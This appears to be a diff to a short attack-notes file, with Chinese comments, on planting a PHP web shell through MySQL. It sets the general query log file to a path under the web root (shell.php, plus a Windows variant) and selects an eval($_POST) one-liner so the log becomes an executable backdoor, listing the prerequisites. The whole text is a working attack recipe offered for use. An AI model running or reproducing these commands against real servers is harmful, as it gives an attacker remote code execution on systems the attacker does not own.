@@ -1,10 +1,14 @@
+# Artical : http://blog.csdn.net/leshami/article/details/39829605
+
 # 前提条件 : 
 #   1. 可以执行 mysql 指令
 #   2. 已知一个可以写的目录
 #   3. mysql创建的日志文件的权限 web 服务器可以读
 set global general_log = 'ON';
 set global general_log_file = '/var/www/html/shell.php'; # 这个目录必须拥有写权限
-select '<?php eval($_POST["c"]); ?>';
+# Windows
+# set global general_log_file = 'D:\\Program\\www\\localhost.log.php';
+select '?><?php eval($_POST[c]); ?>';
 
 
 # 利用 slow query 日志
